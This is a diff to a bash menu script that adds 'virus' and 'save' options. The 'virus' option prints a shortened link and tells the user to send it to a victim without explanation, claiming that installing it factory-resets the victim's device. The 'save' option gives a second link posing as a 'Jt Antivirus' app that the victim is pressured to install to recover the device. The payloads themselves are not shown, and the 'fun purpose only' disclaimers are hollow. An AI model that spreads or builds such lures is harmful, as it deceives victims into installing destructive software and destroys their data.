@@ -97,3 +97,71 @@ save
 elif [ $optnz = "3" ];
 then
 about
+virus(){
+################
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
+echo " "
+echo -e "\e[91m 😈  Copy below link and send it your victim and 
+say nothing to him. when he install it in his/her
+device it will be factory reset and lot more happens.
+                                👇👇👇
+         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
+                                 👆👆👆
+Use only for fun purpose not for harming someone 😇✌️.
+I am not responsible for any kind of loss 
+you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
+echo " "
+echo " "
+echo -e "\e[93m  Copy below link and send it your victim and tell him
+that he should install this application or else his 
+device will not be recovered.( Jt Antivirus)
+                    👇👇👇
+        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+                    👆👆👆
+Use only for fun purpose not for harming someone 😇✌️. 
+And our channel is not responsible for any kind of 
+loss you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+echo -e "$red                    [message this number on WhatsApp 2348050261876]$rset"
+}
+upd(){
+echo -e "$red                    [No update for now]$rset"
+}
